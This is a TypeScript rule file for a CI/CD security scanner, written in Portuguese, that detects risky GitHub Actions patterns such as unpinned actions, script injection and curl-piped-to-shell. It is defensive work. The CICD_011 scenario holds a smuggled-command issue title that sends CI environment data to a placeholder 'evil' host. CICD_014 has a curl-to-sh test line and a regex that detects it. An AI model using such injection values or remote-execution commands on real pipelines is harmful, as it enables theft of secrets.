import { FileRule } from '../types';

export const cicdRules: FileRule[] = [
  {
    id: 'CICD_010',
    title: 'Action referenciada por tag/branch (não SHA)',
    category: 'CI/CD',
    severity: 'high',
    confidence: 'medium',
    description:
      'Uma GitHub Action está referenciada por tag mutável (ex.: @v3) ou branch em vez de um commit SHA imutável de 40 caracteres.',
    impact:
      'Tags e branches podem ser reescritos pelo mantenedor (ou por um atacante que comprometa o repositório da action), injetando código malicioso no seu pipeline com acesso a segredos e ao token do CI.',
    attackScenarioDefensive:
      'Um atacante compromete o repositório da action de terceiros e move a tag v3 para um commit que exfiltra GITHUB_TOKEN e segredos. Todos os workflows que usam @v3 passam a executar o código malicioso na próxima run.',
    remediation:
      'Fixe (pin) cada action por commit SHA completo de 40 caracteres e registre a versão em comentário. Use Dependabot para atualizar os SHAs de forma controlada.',
    safeExample:
      'jobs:\n  build:\n    steps:\n      - uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab # v3.5.2',
    testSuggestion:
      'Crie um workflow com "uses: actions/checkout@v3" e confirme que a regra dispara; troque por um SHA de 40 hex e confirme que não dispara.',
    reference: 'OWASP CICD-SEC-4: Poisoned Pipeline Execution',
    patterns: [/^\s*uses:\s*[\w.-]+\/[\w.-]+@(?!v?[0-9a-f]{40}\b)[\w./-]+/im],
    fileNamePatterns: [/\.github\/workflows\/[^/]+\.ya?ml$/i, /\.gitlab-ci\.ya?ml$/i],
  },
  {
    id: 'CICD_011',
    title: 'Script injection via github.event.* em run:',
    category: 'CI/CD',
    severity: 'critical',
    confidence: 'medium',
    description:
      'Dados controlados pelo usuário (título/corpo de issue ou PR, nome de branch, e-mail, label, comentário) são interpolados diretamente em um passo run: via ${{ github.event.* }} ou ${{ github.head_ref }}.',
    impact:
      'A interpolação ocorre antes do shell executar, permitindo Command Injection no runner. Um atacante pode executar comandos arbitrários, roubar segredos e o GITHUB_TOKEN.',
    attackScenarioDefensive:
      'Um atacante abre uma issue cujo título é "; curl http://evil/$(cat $GITHUB_ENV) #". Quando o workflow interpola github.event.issue.title em um run:, o comando injetado executa no runner e exfiltra dados do ambiente.',
    remediation:
      'Nunca interpole expressões ${{ github.event.* }} dentro de run:. Passe o valor por uma variável de ambiente (env:) e referencie como "$VAR", deixando o shell tratar o dado como string.',
    safeExample:
      "      - run: echo \"PR title: $TITLE\"\n        env:\n          TITLE: ${{ github.event.pull_request.title }}",
    testSuggestion:
      'Adicione um passo "run: echo ${{ github.event.issue.title }}" e confirme a detecção; mova o valor para env: e confirme que não dispara.',
    reference: 'GitHub Security Lab: Keeping your GitHub Actions and workflows secure',
    patterns: [
      /\$\{\{\s*github\.event\.[\w.]*(?:title|body|message|name|email|ref|label|comment)[\w.]*\s*\}\}/i,
      /\$\{\{\s*github\.head_ref\s*\}\}/i,
    ],
    fileNamePatterns: [/\.github\/workflows\/[^/]+\.ya?ml$/i],
  },
  {
    id: 'CICD_012',
    title: 'pull_request_target com checkout de ref não confiável',
    category: 'CI/CD',
    severity: 'critical',
    confidence: 'medium',
    description:
      'O workflow usa o gatilho pull_request_target (que roda com segredos e GITHUB_TOKEN privilegiado) e faz checkout do código do PR (github.event.pull_request.head.sha/ref).',
    impact:
      'Combinar contexto privilegiado com checkout de código não confiável permite que um PR malicioso de um fork execute código arbitrário com acesso a segredos do repositório.',
    attackScenarioDefensive:
      'Um atacante envia um PR de um fork alterando um script de build. Como o workflow usa pull_request_target e faz checkout do head do PR, o script malicioso roda com acesso aos segredos e pode exfiltrá-los.',
    remediation:
      'Evite checkout do código do PR em pull_request_target. Se precisar, separe em dois workflows: um sem segredos (pull_request) para build/test e outro que apenas usa metadados confiáveis. Não dê permissões nem segredos ao job que faz checkout do head do PR.',
    safeExample:
      "on: pull_request   # roda sem segredos do repositório base\njobs:\n  test:\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout@<sha>",
    testSuggestion:
      'Crie um workflow com "on: pull_request_target" e um checkout com "ref: ${{ github.event.pull_request.head.sha }}" e confirme a detecção.',
    reference: 'GitHub Security Lab: Preventing pwn requests',
    patterns: [
      /pull_request_target/i,
      /ref:\s*\$\{\{\s*github\.event\.pull_request\.head\.(?:sha|ref)\s*\}\}/i,
    ],
    fileNamePatterns: [/\.github\/workflows\/[^/]+\.ya?ml$/i],
  },
  {
    id: 'CICD_013',
    title: 'Permissões amplas no GITHUB_TOKEN (write-all)',
    category: 'CI/CD',
    severity: 'high',
    confidence: 'high',
    description:
      'O workflow concede permissions: write-all (ou permissions: {} sem restringir escopos) ao GITHUB_TOKEN, violando o princípio do menor privilégio.',
    impact:
      'Se qualquer passo for comprometido, o token pode escrever em conteúdo, packages, deployments, etc. Amplia drasticamente o raio de impacto de uma execução maliciosa.',
    attackScenarioDefensive:
      'Uma dependência comprometida em um passo do pipeline usa o GITHUB_TOKEN com write-all para fazer push de um commit malicioso ou publicar um package adulterado.',
    remediation:
      'Defina permissions explícitas e mínimas por workflow ou por job (ex.: contents: read) e eleve apenas o escopo estritamente necessário no job que precisa.',
    safeExample:
      'permissions:\n  contents: read\n  pull-requests: write   # apenas onde necessário',
    testSuggestion:
      'Adicione "permissions: write-all" no topo do workflow e confirme a detecção; troque por permissões explícitas mínimas e confirme que não dispara.',
    reference: 'GitHub Docs: Assigning permissions to jobs (least privilege)',
    patterns: [/^\s*permissions:\s*write-all\s*$/im, /^\s*permissions:\s*\{\s*\}\s*$/im],
    fileNamePatterns: [/\.github\/workflows\/[^/]+\.ya?ml$/i],
  },
  {
    id: 'CICD_014',
    title: 'curl|sh / pipe para shell em pipeline',
    category: 'CI/CD',
    severity: 'high',
    confidence: 'medium',
    description:
      'Um passo do pipeline baixa um script com curl/wget e o envia diretamente para sh/bash via pipe, executando código remoto sem verificação de integridade.',
    impact:
      'Se o endpoint remoto for comprometido ou sofrer MITM, código arbitrário executa no runner com acesso a segredos e ao token do CI.',
    attackScenarioDefensive:
      'O domínio que hospeda o instalador é sequestrado. Toda run do pipeline passa a baixar e executar um script que rouba os segredos do ambiente de CI.',
    remediation:
      'Baixe o artefato para um arquivo, verifique checksum/assinatura e só então execute. Prefira instaladores fixados por versão e com hash conhecido.',
    safeExample:
      "      - run: |\n          curl -fsSL -o install.sh https://exemplo.com/install.sh\n          echo \"<sha256conhecido>  install.sh\" | sha256sum -c -\n          sh install.sh",
    testSuggestion:
      'Adicione "run: curl -sSL https://exemplo.com/i.sh | sh" e confirme a detecção; troque por download+verificação de hash e confirme que não dispara.',
    reference: 'OWASP CICD-SEC-4: Poisoned Pipeline Execution',
    patterns: [/\b(?:curl|wget)\b[^\n|]{1,200}\|\s*(?:sudo\s+)?(?:ba)?sh\b/i],
    fileNamePatterns: [/\.github\/workflows\/[^/]+\.ya?ml$/i, /\.gitlab-ci\.ya?ml$/i],
    fileExtensions: ['.yml', '.yaml'],
  },
  {
    id: 'CICD_015',
    title: 'Self-hosted runner em workflow de fork',
    category: 'CI/CD',
    severity: 'high',
    confidence: 'low',
    description:
      'O workflow usa runs-on: self-hosted e é acionado por pull_request/pull_request_target, expondo o runner self-hosted a código de forks.',
    impact:
      'Runners self-hosted são persistentes e geralmente têm acesso à rede interna. Código de um PR malicioso pode comprometer o host, persistir entre jobs e se mover lateralmente na infraestrutura.',
    attackScenarioDefensive:
      'Um atacante abre um PR de um fork que, ao rodar no runner self-hosted, instala um backdoor no host e usa o acesso de rede do runner para alcançar serviços internos.',
    remediation:
      'Não execute workflows acionados por forks em runners self-hosted. Use runners hospedados (ephemeral) para PRs de forks e exija aprovação manual para executar workflows de contribuidores externos.',
    safeExample:
      'on: pull_request\njobs:\n  test:\n    runs-on: ubuntu-latest   # runner efêmero hospedado para PRs de forks',
    testSuggestion:
      'Crie um workflow com "on: pull_request" e "runs-on: self-hosted" e confirme a detecção; troque para "ubuntu-latest" e confirme que não dispara.',
    reference: 'GitHub Docs: Self-hosted runner security',
    patterns: [
      /runs-on:\s*[\s\S]{0,200}?self-hosted/i,
      /on:\s*[\s\S]{0,300}?pull_request(?:_target)?/i,
    ],
    fileNamePatterns: [/\.github\/workflows\/[^/]+\.ya?ml$/i],
  },
];
